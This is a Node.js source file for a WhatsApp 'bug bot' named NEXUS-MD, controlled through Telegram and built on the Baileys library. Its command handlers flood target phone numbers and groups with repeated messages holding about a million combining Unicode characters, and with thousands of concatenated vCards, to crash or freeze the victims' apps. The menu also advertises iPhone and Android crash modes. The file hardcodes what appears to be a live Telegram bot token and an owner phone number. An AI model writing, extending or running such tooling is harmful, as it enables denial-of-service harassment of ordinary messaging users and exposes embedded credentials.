const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay,
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;
const CHANNEL_URL = "https://whatsapp.com/channel/0029Vb7a9bO6RGJKJbh4xR0F";

// 🔥 CYBERPUNK IMAGE URL (මෙතනට කැමති Image URL එකක් දාන්න පුළුවන්)
const AD_IMAGE_URL = "https://telegra.ph/file/a8a183d25667e41793741.jpg";

let botConfig = {
    botName: "NEXUS-MD V3 3M SUPREME",
    owner: "94767475809", 
    prefix: ".",
    isPublic: false 
};

app.get('/', (req, res) => res.send('Nexus System Online! ☠️'));
app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS("Desktop"),
        printQRInTerminal: false,
        syncFullHistory: false
    });

    // --- 🤖 TELEGRAM HANDLER (ENGLISH) ---
    tgBot.on('message', async (msg) => {
        const text = msg.text;
        if (text === '/start') {
            return tgBot.sendMessage(msg.chat.id, "☠️ *NEXUS-MD V3 3M SYSTEM*\n\nPlease send your WhatsApp number to get the Pairing Code.\n*(Example: 94767475809)*", { parse_mode: 'Markdown' });
        }
        if (text && /^\d+$/.test(text) && text.length > 9) {
            try {
                tgBot.sendMessage(msg.chat.id, "⏳ *Generating 3M Power Link...*");
                let code = await sock.requestPairingCode(text.replace(/[^0-9]/g, ''));
                tgBot.sendMessage(msg.chat.id, `🔥 *3M POWER KEY:* \`${code}\` \n\nLink this code to unlock **3,000,000+ Character Bug System**.`, { parse_mode: 'Markdown' });
            } catch (e) { tgBot.sendMessage(msg.chat.id, "❌ *Error!* Restart the bot."); }
        }
    });

    // --- 📩 CONNECTION (AUTO CHANNEL FOLLOW AD) ---
    sock.ev.on('connection.update', async (up) => {
        const { connection } = up;
        if (connection === 'close') startNexus();
        else if (connection === 'open') {
            console.log('✅ 3M BUG BOT READY!');
            const ownerJid = botConfig.owner + "@s.whatsapp.net";
            await sock.sendMessage(ownerJid, { 
                text: `🚀 *SYSTEM LINKED SUCCESSFULLY!*\n\n⚠️ *MASTER:* The 3M character strength is now ACTIVE. To maintain stability, please follow our official channel:\n\n🔗 ${CHANNEL_URL}\n\n_Video Call Crash & 3M Modes are now ready._`,
                contextInfo: { 
                    externalAdReply: { 
                        title: "NEXUS-MD 3M POWER ⚡",
                        body: "Supreme Bug Destroyer Active",
                        mediaType: 1,
                        thumbnailUrl: AD_IMAGE_URL, 
                        sourceUrl: CHANNEL_URL
                    }
                }
            });
        }
    });

    // --- 📩 SUPREME BUG HANDLER (3M+ POWER) ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            const from = mek.key.remoteJid;
            const isOwner = from.includes(botConfig.owner) || mek.key.fromMe;
            
            if (!isOwner) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const text = body.trim().split(/ +/).slice(1).join(" ");
            const target = text + "@s.whatsapp.net";

            // 🔥 3,000,000+ POWER BUG (DEADLY)
            const bug3M = "☠️ 3M SUPREME ☠️\n" + "ꦿ".repeat(300000) + "᥋".repeat(300000) + "꠵".repeat(300000) + "҈".repeat(100000);

            switch (command) {
                case 'menu':
                case 'bug':
                    const menu = `╭───〔 *NEXUS 3M SUPREME* 〕───┈
│
│ 🦠 *3,000,000+ CHARACTER BUG SYSTEM*
│
├ ☠️ *1. .vid_crash* [num] - 3M Video Call Lag
├ 🔥 *2. .ios_dead* [num] - iPhone System Wipe
├ 💀 *3. .kill* [num] - Android Global Crash
├ ❄️ *4. .freeze* [num] - 3M UI Freeze
├ 📍 *5. .loc_bug* [num] - 3M Location Bug
├ 📇 *6. .vcard* [num] - 3M Contact Crash
├ 🌀 *7. .group* [jid] - 3M Group Destroyer
├ 🧨 *8. .bomb* [num] - 3M Spam Bomb
├ 🌌 *9. .the_end* [num] - Total Destruction
│
╰─────────────┈
 👑 *DEV:* SASIYA MD
 📢 *CHANNEL:* ${CHANNEL_URL}`;

                    // 🔥 CYBERPUNK AD MENU MESSAGE
                    await sock.sendMessage(from, { 
                        text: menu,
                        contextInfo: { 
                            externalAdReply: { 
                                title: "NEXUS-MD SUPREME BUG MENU ACTIVE",
                                body: "3,000,000+ Character Power READY",
                                mediaType: 1,
                                thumbnailUrl: AD_IMAGE_URL, 
                                sourceUrl: CHANNEL_URL
                            }
                        }
                    }, { quoted: mek });
                    break;

                // --- Modes logic remain same as before ---
                case 'vid_crash':
                case 'the_end':
                    if (!text) return;
                    await sock.sendMessage(from, { text: "🌑 *DEPLOYING 3M CHARACTER SUPREME BUG...*" });
                    for(let i=0; i<15; i++) {
                        await sock.sendMessage(target, { text: bug3M });
                        await delay(300);
                    }
                    await sock.sendMessage(from, { text: "💀 *TARGET DESTROYED BY 3M POWER!*" });
                    break;

                case 'group':
                    if (!text) return;
                    for(let i=0; i<12; i++) {
                        await sock.sendMessage(text, { text: bug3M });
                    }
                    break;

                case 'vcard':
                    const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:3M Virus\nEND:VCARD'.repeat(2000);
                    await sock.sendMessage(target, { contacts: { displayName: '3M-Supreme', contacts: [{ vcard }] } });
                    break;
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('creds.update', saveCreds);
}

startNexus();
